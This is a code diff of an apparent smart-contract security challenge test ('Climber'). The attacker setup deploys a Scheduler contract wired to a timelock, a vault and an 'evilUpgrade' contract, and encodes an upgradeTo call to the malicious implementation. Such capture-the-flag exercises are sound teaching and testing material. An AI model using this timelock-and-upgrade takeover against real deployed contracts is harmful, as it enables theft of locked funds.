@@ -66,9 +66,23 @@ describe("[Challenge] Climber", function () {
 
     this.scheduler = await (
       await ethers.getContractFactory("Scheduler", attacker)
-    ).deploy(this.timelock.address, this.vault.address, this.evilUpgrade.address)
+    ).deploy(
+      this.timelock.address,
+      this.vault.address,
+      this.evilUpgrade.address
+    );
 
-    console.log(this.scheduler.address)
+    let ABI = ["function upgradeTo(address newImplementation)"];
+    let iface = new ethers.utils.Interface(ABI);
+
+    // await this.timelock.connect(attacker).execute(
+    //   [this.vault.address, this.timelock.address, this.scheduler.address],
+    //   [0,0,0],
+    //   []
+    // )
+    console.log(
+      iface.encodeFunctionData("upgradeTo", [this.evilUpgrade.address])
+    );
   });
 
   after(async function () {
